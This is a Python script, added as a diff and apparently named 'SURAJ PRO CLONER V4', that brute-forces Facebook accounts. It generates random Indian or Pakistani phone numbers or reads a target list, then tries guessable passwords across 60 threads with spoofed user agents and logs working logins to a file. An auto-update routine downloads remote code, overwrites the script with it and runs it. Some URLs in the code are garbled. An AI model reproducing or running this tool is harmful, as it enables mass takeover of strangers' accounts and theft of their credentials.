@@ -1,0 +1,136 @@
+import os, sys, time, json, random, re, uuid, subprocess
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+
+# ज़रूरी लाइब्रेरीज सेटअप
+try:
+    import requests
+    from rich.console import Console
+    from rich.panel import Panel
+except ImportError:
+    os.system('pip install requests rich')
+    import requests
+    from rich.console import Console
+    from rich.panel import Panel
+
+console = Console()
+
+# कलर्स और फॉन्ट
+A = '\x1b[1;97m'; R = '\x1b[38;5;196m'; G = '\x1b[38;5;46m'; B = '\x1b[38;5;45m' # Dark Blue
+
+# --- 1. AUTO UPDATE SYSTEM ---
+def auto_update():
+    # यहाँ अपनी GitHub Raw फाइल का लिंक डालें जहाँ आप नया कोड रखेंगे
+    github_link = "https://githubusercontent.com"
+    try:
+        current_code = open(__file__, 'r').read()
+        latest_code = requests.get(github_link).text
+        if latest_code != current_code and "SurajUltimate" in latest_code:
+            print(f"{G} [!] New Update Found! Updating Tool...")
+            with open(__file__, 'w') as f:
+                f.write(latest_code)
+            print(f"{G} [!] Update Complete. Restarting..."); time.sleep(2)
+            os.execl(sys.executable, sys.executable, *sys.argv)
+    except:
+        pass
+
+# --- 2. BIG BLUE BANNER ---
+def banner():
+    os.system('clear')
+    # बड़े नाम के लिए ASCII ART (4 गुना बड़ा अहसास)
+    print(f"""{B}
+  ██████  ██    ██ ██████   █████      ██ 
+ ██       ██    ██ ██   ██ ██   ██     ██ 
+  ██████  ██    ██ ██████  ███████     ██ 
+       ██ ██    ██ ██   ██ ██   ██     ██ 
+  ██████   ██████  ██   ██ ██   ██     ██ 
+    """)
+    console.print(Panel(f"[bold cyan]      SURAJ PRO CLONER V4 (PREMIUM)[/bold cyan]\n[bold white]  Github: Suraj-9 | Status: Auto-Update ON[/bold white]\n[bold yellow] [!] Use Flight Mode (ON/OFF) For More OK IDs [/bold yellow]", width=50, style="blue"))
+
+class SurajUltimate:
+    def __init__(self):
+        self.ids = []
+        self.ok = 0; self.cp = 0; self.loop = 0
+
+    def menu(self):
+        banner()
+        print(f"{G} [1] {A}India Random Clone (Super Fast)")
+        print(f"{G} [2] {A}Pakistan Random Clone")
+        print(f"{G} [3] {A}File Cloning (Pro Name Passwords)")
+        print(f"{G} [0] {A}Exit")
+        
+        opt = input(f"\n{B} Select Option: {A}")
+        if opt in ['1','2']: self.random_handler(opt)
+        elif opt == '3': self.file_handler()
+        else: exit()
+
+    def random_handler(self, opt):
+        banner()
+        if opt == '1': code = "+91" + input(f"{B} Enter India Code (701/991): {A}")
+        else: code = "+92" + input(f"{B} Enter PK Code (301/308): {A}")
+        
+        limit = int(input(f"{B} Limit (10000+ Recommended): {A}"))
+        for _ in range(limit):
+            num = ''.join(random.choices('0123456789', k=7))
+            self.ids.append(code + num + "|Random User")
+        self.start_engine()
+
+    def file_handler(self):
+        banner()
+        file_path = input(f"{B} Enter File Path: {A}")
+        try:
+            for line in open(file_path, 'r').readlines():
+                self.ids.append(line.strip())
+            self.start_engine()
+        except FileNotFoundError:
+            print(f"{R} File Not Found!"); time.sleep(2); self.menu()
+
+    def start_engine(self):
+        banner()
+        print(f"{G} Total IDs: {len(self.ids)} | Threads: 60")
+        print(f"{A} ------------------------------------------")
+        with ThreadPool(max_workers=60) as pool:
+            for user in self.ids:
+                try:
+                    uid, name = user.split('|')
+                    first = name.split(' ')[0].lower()
+                    
+                    # प्रो लेवल पासवर्ड लिस्ट
+                    ps_list = [name, name.lower(), first+'123', first+'1234', first+'12345', first+'786', first+'@123', first+'007']
+                    if len(uid) >= 10: ps_list.extend([uid[-6:], uid[-7:], uid[-8:], uid])
+                    
+                    pool.submit(self.crack, uid, list(set(ps_list)))
+                except: pass
+        print(f"\n{A} ------------------------------------------")
+        print(f"{G} Done! Results saved in /sdcard/SURAJ-OK.txt")
+
+    def crack(self, uid, ps_list):
+        session = requests.Session()
+        for pw in ps_list:
+            if len(pw) < 6: continue
+            try:
+                # रैंडम प्रो यूजर एजेंट
+                ua = f"Mozilla/5.0 (Linux; Android {random.randint(10,14)}; {random.choice(['SM-G960F', 'Pixel 7', 'Mi 11 Lite'])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110,128)}.0.0.0 Mobile Safari/537.36"
+                
+                # Mbasic / Free FB Combined Method
+                free_fb = session.get(f'https://facebook.com{uid}&flow=login_no_pin').text
+                data = {
+                    "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+                    "uid": uid, "pass": pw, "next": "https://facebook.com"
+                }
+                
+                post = session.post('https://facebook.com', data=data, headers={'user-agent': ua}, allow_redirects=False)
+                
+                if 'c_user' in session.cookies.get_dict():
+                    print(f'\r{G} [SURAJ-OK] {uid} | {pw} {A}')
+                    open('/sdcard/SURAJ-OK.txt', 'a').write(f'{uid}|{pw}\n')
+                    self.ok += 1; break
+                elif 'checkpoint' in session.cookies.get_dict():
+                    self.cp += 1; break
+            except: pass
+        self.loop += 1
+        sys.stdout.write(f'\r{A} [SUR-V4] {self.loop}/{len(self.ids)} {G}OK:{self.ok} {R}CP:{self.cp}'); sys.stdout.flush()
+
+if __name__ == "__main__":
+    auto_update() # टूल चलने से पहले खुद को अपडेट करेगा
+    SurajUltimate().menu()
